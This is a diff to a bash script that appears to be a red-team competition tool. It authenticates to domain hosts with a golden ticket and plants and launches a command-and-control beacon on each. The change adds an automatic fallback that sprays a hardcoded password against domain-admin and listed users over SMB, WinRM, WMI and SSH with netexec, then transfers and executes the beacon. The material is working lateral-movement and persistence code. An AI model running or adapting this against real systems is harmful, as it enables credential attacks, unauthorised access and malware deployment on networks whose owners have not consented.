@@ -126,14 +126,16 @@ echo "[+] Targets: ${TARGETS[*]}"
 
 # ====================== AUTH SETUP ======================
 # Priority: golden ticket → explicit -p creds → spray DA list
+# If golden ticket exists but fails auth, automatically falls back to password spray
 DA_USERS=(Administrator caroline cave chell glados wheatley)
 TICKET="team${TEAM}.ccache"
 USE_KERBEROS=0
 AUTH_FLAG=""
 SPRAY_MODE=0
+FALLBACK_PASS="Th3cake1salie!"
 
 if [[ -z "$PASS" && -f "$TICKET" ]]; then
-  echo "[+] Auth   : golden ticket ($TICKET)"
+  echo "[+] Auth   : golden ticket ($TICKET) — will fallback to password spray if ticket fails"
   export KRB5CCNAME="$(pwd)/${TICKET}"
   USE_KERBEROS=1
   [[ -z "$USER_OVERRIDE" ]] && USER_OVERRIDE="Administrator"
@@ -150,25 +152,33 @@ elif [[ -n "$PASS" ]]; then
 else
   echo "[+] Auth   : spray mode (DA accounts + users.txt, default pass)"
   SPRAY_MODE=1
-  PASS="Th3cake1salie!"
+  PASS="$FALLBACK_PASS"
   AUTH_FLAG="-p"
 fi
 
-# Build user list for spray mode
+# Build user list for spray mode AND for fallback
 ALL_USERS=()
+SPRAY_USERS=()
+
+# Always build the spray user list (used as fallback if kerberos fails)
+for u in "${DA_USERS[@]}"; do SPRAY_USERS+=("$u"); done
+if [[ -f "users.txt" ]]; then
+  while IFS= read -r u || [[ -n "$u" ]]; do
+    [[ -z "$u" ]] && continue
+    already=0
+    for da in "${DA_USERS[@]}"; do
+      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
+    done
+    [[ $already -eq 0 ]] && SPRAY_USERS+=("$u")
+  done < "users.txt"
+fi
+
 if [[ $SPRAY_MODE -eq 1 ]]; then
-  for u in "${DA_USERS[@]}"; do ALL_USERS+=("$u"); done
-  if [[ -f "users.txt" ]]; then
-    while IFS= read -r u || [[ -n "$u" ]]; do
-      [[ -z "$u" ]] && continue
-      already=0
-      for da in "${DA_USERS[@]}"; do
-        [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
-      done
-      [[ $already -eq 0 ]] && ALL_USERS+=("$u")
-    done < "users.txt"
-  fi
+  ALL_USERS=("${SPRAY_USERS[@]}")
   echo "[+] Spray  : ${#ALL_USERS[@]} users"
+elif [[ $USE_KERBEROS -eq 1 ]]; then
+  ALL_USERS=("$USER_OVERRIDE")
+  echo "[+] Fallback users: ${#SPRAY_USERS[@]} (if ticket fails)"
 else
   ALL_USERS=("$USER_OVERRIDE")
 fi
@@ -440,6 +450,11 @@ plant_on_host() {
 
   echo "  [*] ${hostname} (${ip})"
 
+  # Save auth state so kerberos fallback on one host doesn't affect others
+  local save_kerberos=$USE_KERBEROS
+  local save_auth_flag="$AUTH_FLAG"
+  local save_pass="$PASS"
+
   # Determine authed user — try each until one works
   local authed_user="" authed_proto=""
 
@@ -480,8 +495,52 @@ plant_on_host() {
     fi
   done
 
+  # ---- Kerberos fallback: if ticket auth failed, try password spray ----
+  if [[ -z "$authed_user" && $USE_KERBEROS -eq 1 ]]; then
+    echo "    [!] Kerberos ticket failed — falling back to password spray"
+    for user in "${SPRAY_USERS[@]}"; do
+      for proto in smb winrm wmi; do
+        local port
+        case "$proto" in
+          smb)   port=445 ;;
+          winrm) port=5985 ;;
+          wmi)   port=135 ;;
+        esac
+        port_open "$ip" "$port" || continue
+
+        local out
+        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -p "$FALLBACK_PASS" 2>&1)
+
+        if echo "$out" | grep -qi '\[+\]'; then
+          authed_user="$user"
+          authed_proto="$proto"
+          # Switch to password mode for transfer/exec on this host
+          AUTH_FLAG="-p"
+          PASS="$FALLBACK_PASS"
+          USE_KERBEROS=0
+          break 2
+        fi
+      done
+
+      # Try SSH with password
+      if port_open "$ip" 22; then
+        local out
+        out=$(netexec ssh "$ip" -u "$user" -p "$FALLBACK_PASS" 2>&1)
+        if echo "$out" | grep -qi '\[+\]'; then
+          authed_user="$user"
+          authed_proto="ssh"
+          AUTH_FLAG="-p"
+          PASS="$FALLBACK_PASS"
+          USE_KERBEROS=0
+          break
+        fi
+      fi
+    done
+  fi
+
   if [[ -z "$authed_user" ]]; then
     echo "    [-] No valid creds found — skipping"
+    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
     return 1
   fi
   echo "    [+] Auth: ${authed_user} via ${authed_proto}"
@@ -558,15 +617,18 @@ plant_on_host() {
 
   if [[ $transferred -eq 0 ]]; then
     echo "    [-] All transfer methods failed — skipping"
+    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
     return 1
   fi
 
   # ---- EXECUTE ----
   if exec_beacon "$ip" "$authed_user" "$REMOTE_PATH"; then
     echo "    [+] BEACON LAUNCHED on ${hostname}"
+    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
     return 0
   else
     echo "    [-] Transfer OK but execution failed on ${hostname}"
+    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
     return 1
   fi
 }
